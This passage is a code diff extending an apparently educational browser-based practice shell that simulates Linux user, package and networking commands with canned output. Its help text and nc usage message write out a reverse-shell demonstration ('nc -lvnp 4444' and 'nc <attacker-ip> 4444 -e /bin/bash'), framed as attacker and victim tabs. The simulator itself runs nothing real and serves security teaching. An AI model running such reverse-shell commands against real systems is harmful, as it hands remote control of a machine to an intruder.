@@ -24,16 +24,26 @@ const DEFAULT_TIMEOUT_MS = 5_000;
 const SHELL_HELP = `A practice shell — runs safely in your browser, never a real machine.
 
   Navigate : ls  cd  pwd  tree  find  stat  file  realpath
-  Files    : cat  cp  mv  rm  mkdir  rmdir  touch  ln  chmod  du
+  Files    : cat  cp  mv  rm  mkdir  rmdir  touch  ln  chmod  chown  du
   Text     : echo  grep  wc  sort  uniq  head  tail  tac  nl  cut  tr
-             sed  rev  tee  more  less  seq  printf
-  System   : whoami  id  groups  uname  hostname  arch  date  uptime
-             ps  free  df  who  w  env  printenv  history  which  type
+             sed  rev  tee  more  less  seq  printf  nano*
+  Users    : whoami  id  groups  su  sudo  passwd  useradd  usermod  userdel
+  Packages : apt  apt-get  dpkg
+  Network  : ip  ifconfig  ping  dig  nslookup  host  netstat  ss
+             nmap  lsof  curl  wget  ssh  scp  nc / netcat
+  Services : systemctl  service  journalctl  dmesg  crontab
+  Processes: ps  top  htop  kill  jobs  watch  free  df  uptime
+  Scripts  : write a .sh file, chmod +x it, run ./script.sh  (or bash script.sh)
   Shell    : variables (x=5)  ·  \$(( )) math  ·  \$(cmd)  ·  pipes |
              &&  ||  ·  redirection > >> <  ·  if / for / while  ·  clear
 
 Try:  ls -la      ·   cat readme.md      ·   grep -i error /var/log/syslog
-      cd projects && tree     ·   echo "hi" > note.txt && cat note.txt
+      nmap 10.0.0.5      ·   ping -c 3 google.com      ·   sudo apt update
+      chmod +x scripts/hello.sh && ./scripts/hello.sh
+
+Reverse-shell demo — open a second tab (the ⧉ button), then:
+      Tab A:  nc -lvnp 4444            Tab B:  nc <tabA-ip> 4444 -e /bin/bash
+  * full-screen editors (nano/vi) show a redirection tip instead.
 `;
 
 class ShellError extends Error {}
@@ -46,12 +56,27 @@ type Quote = 'none' | 'single' | 'double';
 interface Chunk { s: string; q: Quote }
 interface Tok { op?: string; word?: Chunk[] }
 /* ── Virtual filesystem (used by the interactive shell; unused by one-shot runBash) ── */
-interface FSFile { file: string; mode?: string }
-interface FSDir { dir: Record<string, FSNode>; mode?: string }
+interface FSFile { file: string; mode?: string; owner?: string; group?: string }
+interface FSDir { dir: Record<string, FSNode>; mode?: string; owner?: string; group?: string }
 type FSNode = FSFile | FSDir;
 const isDir = (n: FSNode | undefined): n is FSDir => !!n && 'dir' in n;
 const isFile = (n: FSNode | undefined): n is FSFile => !!n && 'file' in n;
 const modeOf = (n: FSNode) => n.mode ?? (isDir(n) ? 'rwxr-xr-x' : 'rw-r--r--');
+const ownerOf = (n: FSNode, ctx: Ctx) => n.owner ?? ctx.user ?? 'user';
+const groupOf = (n: FSNode, ctx: Ctx) => n.group ?? n.owner ?? ctx.user ?? 'user';
+
+/** A request, raised by `nc`, for the terminal UI to open a live cross-tab socket. */
+export interface NetRequest {
+  mode: 'listen' | 'connect';
+  host?: string;
+  port: number;
+  /** `-e` — serve a shell to whoever is on the other end (bind/reverse shell). */
+  exec: boolean;
+  verbose: boolean;
+}
+
+/** One saved identity on the `su` stack, restored on `exit`. */
+interface Identity { user: string; home: string; cwd: string; env: Record<string, string> }
 
 interface Ctx {
   env: Record<string, string>;
@@ -66,6 +91,20 @@ interface Ctx {
   user?: string;
   history?: string[];
   cleared?: boolean;
+  /** Positional parameters ($1, $2, …) while executing a script. */
+  params?: string[];
+  /** Identity stack pushed by `su` / `sudo -i`, popped by `exit`. */
+  userStack?: Identity[];
+  /** This tab's IP on the simulated LAN, reported by ip/ifconfig/nc. */
+  localIp?: string;
+  /** Set by `nc` so the session surfaces a live-socket request to the UI. */
+  net?: NetRequest | null;
+  /** Simulated crontab lines for the current user. */
+  crontab?: string[];
+  /** Simulated installed packages (for apt/dpkg). */
+  packages?: Set<string>;
+  /** Guard against runaway recursion when scripts call scripts. */
+  depth?: number;
 }
 interface IO { stdin: string; w: (s: string) => void; ctx: Ctx; rawWords?: Tok[] }
 /* eslint-disable @typescript-eslint/no-explicit-any */
@@ -370,6 +409,14 @@ function expandDollar(text: string, ctx: Ctx): string {
       k++; out += lookup(name, ctx); i = k; continue;
     }
     if (text[i + 1] === '?') { out += String(ctx.status); i += 2; continue; }
+    // Positional & special params: $0 $1..$9  $#  $@  $*
+    if (text[i + 1] === '#') { out += String((ctx.params ?? []).length); i += 2; continue; }
+    if (text[i + 1] === '@' || text[i + 1] === '*') { out += (ctx.params ?? []).join(' '); i += 2; continue; }
+    if (/[0-9]/.test(text[i + 1])) {
+      const idx = Number(text[i + 1]);
+      out += idx === 0 ? (ctx.env['0'] ?? 'bash') : ((ctx.params ?? [])[idx - 1] ?? '');
+      i += 2; continue;
+    }
     const m = /^[A-Za-z_][A-Za-z0-9_]*/.exec(text.slice(i + 1));
     if (m) { out += lookup(m[0], ctx); i += 1 + m[0].length; continue; }
     out += '$'; i++;
@@ -534,8 +581,10 @@ function execSimple(node: Node, ctx: Ctx, stdin: string, captured: boolean): { o
   let out = '';
   const w = (s: string) => { out += s; };
   let status = 0;
+  const io: IO = { stdin: effStdin, w, ctx, rawWords: rest };
   const b = BUILTINS[cmd];
-  if (b) status = b(args, { stdin: effStdin, w, ctx, rawWords: rest }) | 0;
+  if (b) status = b(args, io) | 0;
+  else if (cmd.includes('/')) status = execFile(cmd, args, io) | 0;
   else { out += `${cmd}: command not found\n`; status = 127; }
 
   return applyOutRedir(out, status);
@@ -548,6 +597,218 @@ function applyAssign(w: Tok, ctx: Ctx) {
   let expanded = '';
   for (const ch of w.word ?? []) expanded += ch.q === 'single' ? ch.s : expandDollar(ch.s, ctx);
   ctx.env[name] = expanded.slice(name.length + 1);
+}
+
+/**
+ * Run a script's source in a child context that shares the filesystem but gets
+ * its own env/cwd (a subshell), with `argv` bound to $0, $1…, $@, $#.
+ */
+function runScriptContent(content: string, argv: string[], parent: Ctx, io: IO): number {
+  const depth = (parent.depth ?? 0) + 1;
+  if (depth > 25) { io.w('bash: script recursion limit reached\n'); return 1; }
+  const sub: Ctx = {
+    env: Object.assign(Object.create(null), parent.env),
+    status: parent.status,
+    out: '',
+    stdinBuf: io.stdin ?? '',
+    stdinPos: 0,
+    checkTime: parent.checkTime,
+    fs: parent.fs,
+    cwd: parent.cwd,
+    home: parent.home,
+    user: parent.user,
+    localIp: parent.localIp,
+    params: argv.slice(1),
+    depth,
+    crontab: parent.crontab,
+    packages: parent.packages,
+    userStack: parent.userStack,
+  };
+  sub.env['0'] = argv[0] ?? 'script';
+  try {
+    runList(parse(tokenize(content)), sub);
+  } catch (e) {
+    io.w(sub.out);
+    if (e instanceof ExitSignal) return e.code;
+    io.w(`bash: ${e instanceof Error ? e.message : String(e)}\n`);
+    return 1;
+  }
+  io.w(sub.out);
+  return sub.status;
+}
+
+/** Execute a program referenced by path (e.g. `./deploy.sh`, `/home/u/x.sh`). */
+function execFile(cmd: string, args: string[], io: IO): number {
+  const ctx = io.ctx;
+  if (!ctx.fs) { io.w(`bash: ${cmd}: No such file or directory\n`); return 127; }
+  const n = nodeAt(ctx.fs, resolvePath(ctx, cmd));
+  if (n === undefined) { io.w(`bash: ${cmd}: No such file or directory\n`); return 127; }
+  if (isDir(n)) { io.w(`bash: ${cmd}: Is a directory\n`); return 126; }
+  if (!modeOf(n).includes('x')) { io.w(`bash: ${cmd}: Permission denied\n`); return 126; }
+  return runScriptContent(n.file, [cmd, ...args], ctx, io);
+}
+
+/* ── Identity (su / sudo) ── */
+function pushIdentity(ctx: Ctx) {
+  (ctx.userStack ??= []).push({
+    user: ctx.user ?? 'user',
+    home: ctx.home ?? '/root',
+    cwd: ctx.cwd ?? '/',
+    env: { USER: ctx.env.USER, LOGNAME: ctx.env.LOGNAME, HOME: ctx.env.HOME, PWD: ctx.env.PWD },
+  });
+}
+function popIdentity(ctx: Ctx) {
+  const id = ctx.userStack?.pop();
+  if (!id) return;
+  ctx.user = id.user; ctx.home = id.home; ctx.cwd = id.cwd;
+  ctx.env.USER = id.env.USER; ctx.env.LOGNAME = id.env.LOGNAME; ctx.env.HOME = id.env.HOME; ctx.env.PWD = id.cwd;
+}
+function becomeUser(ctx: Ctx, user: string, login: boolean) {
+  pushIdentity(ctx);
+  const home = user === 'root' ? '/root' : `/home/${user}`;
+  ctx.user = user; ctx.home = home;
+  ctx.env.USER = user; ctx.env.LOGNAME = user; ctx.env.HOME = home;
+  if (login) { ctx.cwd = home; ctx.env.PWD = home; }
+}
+
+/* ── Simulated network ── */
+const LAB_HOSTS: Record<string, string> = {
+  localhost: '127.0.0.1',
+  cyberkhana: '127.0.1.1',
+  'target.lab': '10.0.0.5',
+  gateway: '10.0.0.1',
+  router: '10.0.0.1',
+  'example.com': '93.184.216.34',
+  'google.com': '142.250.190.14',
+  'github.com': '140.82.121.3',
+  'scanme.nmap.org': '45.33.32.156',
+  'cyberkhana.tech': '167.235.193.228',
+};
+/** Resolve a hostname to an IP (deterministic pseudo-IP for unknown names). */
+function resolveHost(h: string): string {
+  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) return h;
+  const key = h.toLowerCase();
+  if (LAB_HOSTS[key]) return LAB_HOSTS[key];
+  let x = 0;
+  for (const c of key) x = (x * 31 + c.charCodeAt(0)) >>> 0;
+  return `93.${(x >> 16) & 255}.${(x >> 8) & 255}.${x & 255}`;
+}
+const localIpOf = (ctx: Ctx) => ctx.localIp ?? '10.0.0.15';
+
+/** Two lock-step socket views (ss / netstat share one renderer). */
+function sockStat(_args: string[], io: IO): number {
+  const ip = localIpOf(io.ctx);
+  io.w('Netid  State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port\n');
+  io.w('tcp    LISTEN  0       128      0.0.0.0:22             0.0.0.0:*\n');
+  io.w('tcp    LISTEN  0       511      0.0.0.0:80             0.0.0.0:*\n');
+  io.w(`tcp    LISTEN  0       128      ${ip}:4444           0.0.0.0:*\n`);
+  io.w(`tcp    ESTAB   0       0        ${ip}:51234          10.0.0.5:22\n`);
+  return 0;
+}
+
+/* ── Package management (apt / dpkg) ── */
+function aptRun(args: string[], io: IO): number {
+  const ctx = io.ctx;
+  const w = io.w;
+  ctx.packages ??= new Set();
+  const sub = args.find((a) => !a.startsWith('-')) ?? '';
+  const pkgs = args.slice(args.indexOf(sub) + 1).filter((a) => !a.startsWith('-'));
+  switch (sub) {
+    case 'update':
+      w('Hit:1 http://deb.cyberkhana.local stable InRelease\nReading package lists... Done\nAll packages are up to date.\n');
+      return 0;
+    case 'upgrade': case 'full-upgrade': case 'dist-upgrade':
+      w('Reading package lists... Done\nBuilding dependency tree... Done\nCalculating upgrade... Done\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\n');
+      return 0;
+    case 'install': {
+      if (!pkgs.length) { w('E: You must specify at least one package to install.\n'); return 1; }
+      w('Reading package lists... Done\nBuilding dependency tree... Done\n');
+      w(`The following NEW packages will be installed:\n  ${pkgs.join(' ')}\n`);
+      for (const p of pkgs) { ctx.packages.add(p); w(`Setting up ${p} ...\n`); }
+      return 0;
+    }
+    case 'remove': case 'purge': case 'autoremove': {
+      w('Reading package lists... Done\nBuilding dependency tree... Done\n');
+      for (const p of pkgs) ctx.packages.delete(p);
+      w(pkgs.length ? `Removing ${pkgs.join(' ')} ...\n` : '0 to remove and 0 not upgraded.\n');
+      return 0;
+    }
+    case 'search':
+      w('nmap/stable 7.94 amd64\n  the Network Mapper — a security scanner\nnetcat-traditional/stable 1.10 amd64\n  TCP/IP swiss army knife\n');
+      return 0;
+    case 'show':
+      w(`Package: ${pkgs[0] ?? 'nmap'}\nVersion: 7.94\nSection: net\nMaintainer: CyberKhana Labs\nDescription: ${pkgs[0] ?? 'nmap'} — installed in the practice sandbox\n`);
+      return 0;
+    case 'list':
+      w([...ctx.packages].sort().map((p) => `${p}/stable,now 1.0 amd64 [installed]`).join('\n') + (ctx.packages.size ? '\n' : 'Listing... Done\n'));
+      return 0;
+    default:
+      w('Usage: apt update | upgrade | install <pkg> | remove <pkg> | search <term> | list\n');
+      return 1;
+  }
+}
+
+function addUser(args: string[], io: IO, verbose: boolean): number {
+  const ctx = io.ctx;
+  const name = args.filter((a) => !a.startsWith('-')).pop();
+  if (!name) { io.w('Usage: useradd [options] LOGIN\n'); return 1; }
+  if (ctx.fs) {
+    ensureDir(ctx.fs, `/home/${name}`);
+    const passwd = nodeAt(ctx.fs, '/etc/passwd');
+    if (isFile(passwd) && !passwd.file.split('\n').some((l) => l.startsWith(name + ':'))) {
+      passwd.file += `${name}:x:1001:1001:${name}:/home/${name}:/bin/bash\n`;
+    }
+  }
+  if (verbose) {
+    io.w(`Adding user \`${name}' ...\nAdding new group \`${name}' (1001) ...\nAdding new user \`${name}' (1001) with group \`${name}' ...\nCreating home directory \`/home/${name}' ...\nCopying files from \`/etc/skel' ...\n`);
+  }
+  return 0;
+}
+
+/** Friendly stand-in for full-screen editors, which a line terminal can't host. */
+function editorNote(name: string, args: string[]): string {
+  const f = args.filter((a) => !a.startsWith('-'))[0];
+  return `[i] ${name}: full-screen editors aren't available in this browser terminal.\n` +
+    `To create or edit ${f ? `'${f}'` : 'a file'}, use redirection instead:\n` +
+    (f
+      ? `    echo "your text" > ${f}      # create / overwrite\n    echo "more lines"  >> ${f}     # append\n    cat ${f}                     # view it\n`
+      : `    echo "your text" > file.txt\n    cat file.txt\n`);
+}
+
+/** The `nc`/`netcat` front-end: parses args and asks the UI for a live socket. */
+function ncRun(args: string[], io: IO): number {
+  const ctx = io.ctx;
+  const w = io.w;
+  if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
+    w('usage: nc [-lvn] [-p port] [-e prog] [hostname] [port]\n' +
+      '  -l  listen for an incoming connection\n' +
+      '  -v  verbose      -n  numeric only      -p  local port\n' +
+      '  -e  program to run after connect (bind / reverse shell)\n\n' +
+      'Try it across two terminal tabs:\n' +
+      '  Tab A (attacker):  nc -lvnp 4444\n' +
+      '  Tab B (victim):    nc <attacker-ip> 4444 -e /bin/bash\n' +
+      "  Then type commands in Tab A — you're driving Tab B's shell.\n");
+    return 0;
+  }
+  const flags = args.filter((a) => a.startsWith('-') && !/^-\d+$/.test(a));
+  const listen = flags.some((f) => f.includes('l'));
+  const verbose = flags.some((f) => f.includes('v'));
+  const exec = args.includes('-e');
+  const positional: string[] = [];
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (a === '-e') { i++; continue; }
+    if (a === '-p') { const v = args[++i]; if (v) positional.push(v); continue; }
+    if (a.startsWith('-')) continue;
+    positional.push(a);
+  }
+  const nums = positional.filter((p) => /^\d+$/.test(p));
+  const port = parseInt(nums[nums.length - 1] ?? '', 10);
+  const host = listen ? undefined : positional.find((p) => !/^\d+$/.test(p));
+  if (!port || Number.isNaN(port)) { w('nc: missing or invalid port number\n'); return 1; }
+  if (!ctx.fs) { w('nc: live connections are only available in the interactive terminal.\n'); return 1; }
+  ctx.net = { mode: listen ? 'listen' : 'connect', host, port, exec, verbose };
+  return 0;
 }
 
 /* ── Builtins & coreutils ── */
@@ -817,7 +1078,7 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
     const n = nodeAt(ctx.fs, abs);
     if (n === undefined) { w(`ls: cannot access '${target}': No such file or directory\n`); return 1; }
     if (isFile(n)) {
-      if (long) w(`-${modeOf(n)} 1 ${ctx.user ?? 'user'} ${ctx.user ?? 'user'} ${String(n.file.length).padStart(5)} ${target}\n`);
+      if (long) w(`-${modeOf(n)} 1 ${ownerOf(n, ctx)} ${groupOf(n, ctx)} ${String(n.file.length).padStart(5)} ${target}\n`);
       else w(target + '\n');
       return 0;
     }
@@ -829,7 +1090,7 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
       w(names.map((nm) => {
         const c = child(nm);
         const size = isFile(c) ? c.file.length : 4096;
-        return `${isDir(c) ? 'd' : '-'}${modeOf(c)} 1 ${ctx.user ?? 'user'} ${ctx.user ?? 'user'} ${String(size).padStart(5)} ${isDir(c) ? nm + '/' : nm}`;
+        return `${isDir(c) ? 'd' : '-'}${modeOf(c)} 1 ${ownerOf(c, ctx)} ${groupOf(c, ctx)} ${String(size).padStart(5)} ${isDir(c) ? nm + '/' : nm}`;
       }).join('\n') + (names.length ? '\n' : ''));
     } else {
       w(names.map((nm) => (isDir(child(nm)) ? nm + '/' : nm)).join('  ') + (names.length ? '\n' : ''));
@@ -1002,7 +1263,7 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
     const n = nodeAt(ctx.fs, resolvePath(ctx, t));
     if (n === undefined) { w(`stat: cannot stat '${t}': No such file or directory\n`); return 1; }
     const size = isFile(n) ? n.file.length : 4096;
-    w(`  File: ${t}\n  Size: ${size}\t\tType: ${isDir(n) ? 'directory' : 'regular file'}\nAccess: (${isDir(n) ? '0755' : '0644'}/${isDir(n) ? 'd' : '-'}${modeOf(n)})  Uid: (1000/${ctx.user ?? 'user'})  Gid: (1000/${ctx.user ?? 'user'})\n`);
+    w(`  File: ${t}\n  Size: ${size}\t\tType: ${isDir(n) ? 'directory' : 'regular file'}\nAccess: (${isDir(n) ? '0755' : '0644'}/${isDir(n) ? 'd' : '-'}${modeOf(n)})  Uid: (1000/${ownerOf(n, ctx)})  Gid: (1000/${groupOf(n, ctx)})\n`);
     return 0;
   },
   du(args, { w, ctx }) {
@@ -1082,7 +1343,408 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
   yes(args, { w }) { const s = args.join(' ') || 'y'; let out = ''; for (let i = 0; i < 1000; i++) out += s + '\n'; w(out); return 0; },
   export(args, { ctx }) { for (const a of args) { const m = /^([A-Za-z_]\w*)=(.*)$/s.exec(a); if (m) ctx.env[m[1]] = m[2]; } return 0; },
   sleep() { return 0; },
-  exit(args) { throw new ExitSignal(parseInt(args[0], 10) || 0); },
+  exit(args, { ctx }) {
+    const code = parseInt(args[0], 10) || 0;
+    // Inside `su`/`sudo -i`, `exit` returns to the previous identity instead of closing the shell.
+    if (ctx.userStack && ctx.userStack.length) { popIdentity(ctx); return 0; }
+    throw new ExitSignal(code);
+  },
+  logout(args, io) { return BUILTINS.exit(args, io); },
+
+  /* ── Running scripts ── */
+  bash(args, io) {
+    const ctx = io.ctx;
+    const ci = args.indexOf('-c');
+    if (ci !== -1 && args[ci + 1] !== undefined) return runScriptContent(args[ci + 1], ['bash', ...args.slice(ci + 2)], ctx, io);
+    const file = args.find((a) => !a.startsWith('-'));
+    if (!file) return 0; // `bash` with no script = a nested interactive shell (no-op here)
+    const n = ctx.fs ? nodeAt(ctx.fs, resolvePath(ctx, file)) : undefined;
+    if (!isFile(n)) { io.w(`bash: ${file}: No such file or directory\n`); return 127; }
+    return runScriptContent(n.file, [file, ...args.slice(args.indexOf(file) + 1)], ctx, io);
+  },
+  sh(args, io) { return BUILTINS.bash(args, io); },
+  source(args, io) {
+    const ctx = io.ctx;
+    const file = args[0];
+    if (!file) { io.w('source: filename argument required\n'); return 2; }
+    const n = ctx.fs ? nodeAt(ctx.fs, resolvePath(ctx, file)) : undefined;
+    if (!isFile(n)) { io.w(`bash: source: ${file}: No such file or directory\n`); return 1; }
+    const saved = ctx.out; ctx.out = '';
+    try { runList(parse(tokenize(n.file)), ctx); }
+    catch (e) { if (!(e instanceof ExitSignal)) io.w(`bash: ${e instanceof Error ? e.message : String(e)}\n`); }
+    const produced = ctx.out; ctx.out = saved; io.w(produced);
+    return ctx.status;
+  },
+  '.': (args, io) => BUILTINS.source(args, io),
+
+  /* ── Users, permissions, privilege ── */
+  sudo(args, io) {
+    const ctx = io.ctx;
+    let i = 0;
+    while (['-n', '-E', '-H', '-k', '-b'].includes(args[i])) i++;
+    if (args[i] === '-l' || args[i] === '-ll') {
+      io.w(`Matching Defaults entries for ${ctx.user ?? 'user'} on cyberkhana:\n    env_reset, secure_path=/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ${ctx.user ?? 'user'} may run the following commands on cyberkhana:\n    (ALL : ALL) ALL\n`);
+      return 0;
+    }
+    if (args[i] === '-i' || args[i] === '-s' || args[i] === 'su') { becomeUser(ctx, 'root', true); return 0; }
+    const cmd = args[i];
+    if (!cmd) { io.w('usage: sudo -h | -l | [-i] command [args]\n'); return 1; }
+    const rest = args.slice(i + 1);
+    const b = BUILTINS[cmd];
+    if (b) return b(rest, io) | 0;
+    if (cmd.includes('/')) return execFile(cmd, rest, io);
+    io.w(`sudo: ${cmd}: command not found\n`); return 1;
+  },
+  su(args, io) {
+    const ctx = io.ctx;
+    const login = args.includes('-') || args.includes('-l') || args.includes('--login');
+    const target = args.filter((a) => a !== '-' && !a.startsWith('-'))[0] ?? 'root';
+    becomeUser(ctx, target, login);
+    return 0;
+  },
+  passwd(args, { w, ctx }) {
+    const who = args.find((a) => !a.startsWith('-')) ?? ctx.user ?? 'user';
+    w(`passwd: password updated successfully for ${who}\n`);
+    return 0;
+  },
+  useradd(args, io) { return addUser(args, io, false); },
+  adduser(args, io) { return addUser(args, io, true); },
+  usermod(args, { w }) { if (!args.length) { w('Usage: usermod [options] LOGIN\n'); return 1; } return 0; },
+  userdel(args, { w, ctx }) {
+    const rem = args.includes('-r');
+    const name = args.filter((a) => !a.startsWith('-')).pop();
+    if (!name) { w('Usage: userdel [-r] LOGIN\n'); return 1; }
+    if (ctx.fs) {
+      const passwd = nodeAt(ctx.fs, '/etc/passwd');
+      if (isFile(passwd)) passwd.file = passwd.file.split('\n').filter((l) => !l.startsWith(name + ':')).join('\n');
+      if (rem) { const { parent, name: nm } = parentAndName(`/home/${name}`); const par = nodeAt(ctx.fs, parent); if (isDir(par)) delete par.dir[nm]; }
+    }
+    return 0;
+  },
+  chown(args, { w, ctx }) {
+    if (!ctx.fs) return 0;
+    const rec = args.some((a) => a.startsWith('-') && /R/.test(a));
+    const spec = args.find((a) => !a.startsWith('-')) ?? '';
+    const targets = args.filter((a) => !a.startsWith('-') && a !== spec);
+    const [owner, group] = spec.split(':');
+    const apply = (n: FSNode) => {
+      if (owner) n.owner = owner;
+      if (group !== undefined && group !== '') n.group = group;
+      if (rec && isDir(n)) for (const k of Object.keys(n.dir)) apply(n.dir[k]);
+    };
+    let status = 0;
+    for (const t of targets) {
+      const n = nodeAt(ctx.fs, resolvePath(ctx, t));
+      if (n === undefined) { w(`chown: cannot access '${t}': No such file or directory\n`); status = 1; continue; }
+      apply(n);
+    }
+    return status;
+  },
+  chgrp(args, { w, ctx }) {
+    if (!ctx.fs) return 0;
+    const grp = args.find((a) => !a.startsWith('-')) ?? '';
+    const targets = args.filter((a) => !a.startsWith('-') && a !== grp);
+    let status = 0;
+    for (const t of targets) {
+      const n = nodeAt(ctx.fs, resolvePath(ctx, t));
+      if (n === undefined) { w(`chgrp: cannot access '${t}': No such file or directory\n`); status = 1; continue; }
+      n.group = grp;
+    }
+    return status;
+  },
+
+  /* ── Package & tool management ── */
+  apt(args, io) { return aptRun(args, io); },
+  'apt-get': (args, io) => aptRun(args, io),
+  dpkg(args, { w, ctx }) {
+    ctx.packages ??= new Set();
+    if (args[0] === '-i' || args[0] === '--install') {
+      const deb = args[1] ?? 'package.deb';
+      const name = (deb.split('/').pop() ?? deb).replace(/_.*$/, '').replace(/\.deb$/, '');
+      ctx.packages.add(name);
+      w(`Selecting previously unselected package ${name}.\n(Reading database ... 24601 files and directories currently installed.)\nPreparing to unpack ${deb} ...\nUnpacking ${name} ...\nSetting up ${name} ...\nProcessing triggers for man-db ...\n`);
+      return 0;
+    }
+    if (args[0] === '-l' || args[0] === '--list') {
+      const rows = [...ctx.packages].sort().map((p) => `ii  ${p.padEnd(22)} 1.0      amd64   ${p} package`);
+      w('Desired=Unknown/Install/Remove/Purge/Hold\n| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n||/ Name                   Version  Arch    Description\n+++-======================-========-=======-=======================\n' + (rows.length ? rows.join('\n') + '\n' : ''));
+      return 0;
+    }
+    if (args[0] === '-L') { const p = args[1] ?? 'pkg'; w(`/.\n/usr\n/usr/bin\n/usr/bin/${p}\n/usr/share/doc/${p}\n/usr/share/doc/${p}/README\n`); return 0; }
+    w("dpkg: error: need an action option (-i to install, -l to list, -L to list files)\n"); return 1;
+  },
+
+  /* ── Networking ── */
+  ip(args, { w, ctx }) {
+    const ip = localIpOf(ctx);
+    const sub = args.find((a) => !a.startsWith('-')) ?? 'addr';
+    if (sub === 'a' || sub === 'addr' || sub === 'address') {
+      w(`1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 02:42:0a:00:00:0f brd ff:ff:ff:ff:ff:ff\n    inet ${ip}/24 brd 10.0.0.255 scope global eth0\n       valid_lft forever preferred_lft forever\n`);
+      return 0;
+    }
+    if (sub === 'r' || sub === 'route') { w(`default via 10.0.0.1 dev eth0 proto dhcp src ${ip} metric 100\n10.0.0.0/24 dev eth0 proto kernel scope link src ${ip}\n`); return 0; }
+    if (sub === 'link') { w('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n'); return 0; }
+    if (sub === 'neigh') { w('10.0.0.1 dev eth0 lladdr 02:42:0a:00:00:01 REACHABLE\n10.0.0.5 dev eth0 lladdr 02:42:0a:00:00:05 STALE\n'); return 0; }
+    w('Usage: ip [ address | route | link | neigh ] ...\n'); return 1;
+  },
+  ifconfig(_args, { w, ctx }) {
+    const ip = localIpOf(ctx);
+    w(`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet ${ip}  netmask 255.255.255.0  broadcast 10.0.0.255\n        ether 02:42:0a:00:00:0f  txqueuelen 1000  (Ethernet)\n        RX packets 1024  bytes 512000 (500.0 KiB)\n        TX packets 512  bytes 128000 (125.0 KiB)\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1000  (Local Loopback)\n`);
+    return 0;
+  },
+  ping(args, { w }) {
+    let count = 4;
+    for (let i = 0; i < args.length; i++) {
+      const a = args[i];
+      if (a === '-c') count = Math.min(10, Math.max(1, parseInt(args[++i], 10) || 4));
+      else if (/^-c\d+$/.test(a)) count = Math.min(10, Math.max(1, parseInt(a.slice(2), 10)));
+    }
+    const host = nonFlagFiles(args, ['-c', '-i', '-s', '-W', '-t']).pop();
+    if (!host) { w('ping: usage error: Destination address required\n'); return 1; }
+    const ip = resolveHost(host);
+    w(`PING ${host} (${ip}) 56(84) bytes of data.\n`);
+    let total = 0;
+    for (let i = 0; i < count; i++) { const t = (Math.random() * 8 + 8).toFixed(1); total += parseFloat(t); w(`64 bytes from ${ip}: icmp_seq=${i + 1} ttl=63 time=${t} ms\n`); }
+    const avg = (total / count).toFixed(1);
+    w(`\n--- ${host} ping statistics ---\n${count} packets transmitted, ${count} received, 0% packet loss, time ${count * 1000}ms\nrtt min/avg/max/mdev = ${avg}/${avg}/${avg}/0.512 ms\n`);
+    return 0;
+  },
+  dig(args, { w }) {
+    const short = args.includes('+short');
+    const types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA'];
+    const rest = args.filter((a) => !a.startsWith('+') && !a.startsWith('-') && !a.startsWith('@'));
+    const host = rest.find((a) => !types.includes(a.toUpperCase())) ?? 'example.com';
+    const type = (rest.find((a) => types.includes(a.toUpperCase())) ?? 'A').toUpperCase();
+    const ip = resolveHost(host);
+    if (short) { w(ip + '\n'); return 0; }
+    w(`; <<>> DiG 9.18.0 <<>> ${host} ${type === 'A' ? '' : type}\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4242\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; QUESTION SECTION:\n;${host}.\t\t\tIN\t${type}\n\n;; ANSWER SECTION:\n${host}.\t\t300\tIN\t${type}\t${ip}\n\n;; Query time: 12 msec\n;; SERVER: 10.0.0.1#53(10.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 68\n`);
+    return 0;
+  },
+  nslookup(args, { w }) {
+    const host = args.filter((a) => !a.startsWith('-') && !a.startsWith('@'))[0] ?? 'example.com';
+    const ip = resolveHost(host);
+    w(`Server:\t\t10.0.0.1\nAddress:\t10.0.0.1#53\n\nNon-authoritative answer:\nName:\t${host}\nAddress: ${ip}\n`);
+    return 0;
+  },
+  host(args, { w }) {
+    const h = args.filter((a) => !a.startsWith('-'))[0] ?? 'example.com';
+    const ip = resolveHost(h);
+    w(`${h} has address ${ip}\n${h} mail is handled by 10 mail.${h}.\n`);
+    return 0;
+  },
+  lsof(args, { w, ctx }) {
+    const u = ctx.user ?? 'user';
+    if (args.includes('-i')) {
+      w(`COMMAND   PID   USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME\nsshd     1000   root    3u  IPv4   15423     0t0  TCP *:22 (LISTEN)\nnginx    1502  ${u.padEnd(6)}6u  IPv4   16120     0t0  TCP *:80 (LISTEN)\nnc       2100  ${u.padEnd(6)}3u  IPv4   18033     0t0  TCP ${localIpOf(ctx)}:4444 (LISTEN)\n`);
+      return 0;
+    }
+    w(`COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME\nbash     1337  ${u.padEnd(6)}cwd    DIR  254,1     4096 131073 ${ctx.cwd ?? '/'}\nbash     1337  ${u.padEnd(6)}txt    REG  254,1  1234376 262145 /usr/bin/bash\n`);
